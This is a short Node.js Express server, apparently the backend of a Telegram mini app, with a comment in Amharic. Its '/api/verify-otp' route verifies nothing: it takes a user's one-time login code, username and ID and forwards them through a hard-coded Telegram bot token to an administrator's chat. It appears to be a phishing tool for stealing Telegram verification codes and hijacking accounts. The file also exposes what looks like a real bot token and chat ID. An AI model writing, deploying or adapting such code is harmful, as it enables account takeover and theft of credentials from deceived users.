const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(bodyParser.json());
app.use(cors());

// የተሰጡዎት ትክክለኛ መረጃዎች
const BOT_TOKEN = '9062994222:AAF4my5zXC5SDlZyHFyfVnR0VPONoRtQiW4';
const ADMIN_CHAT_ID = '7184853477';

app.post('/api/auth', async (req, res) => {
    try {
        const { id, first_name, username } = req.body;
        console.log(`User opened mini app: ${first_name} (@${username || 'N/A'}) ID: ${id}`);
        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { code, user_id, username } = req.body;
        const message = `🔔 New OTP Verification!\n\n👤 User ID: \`${user_id || 'N/A'}\`\nUsername: @${username || 'N/A'}\nCode (OTP): \`${code}\``;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});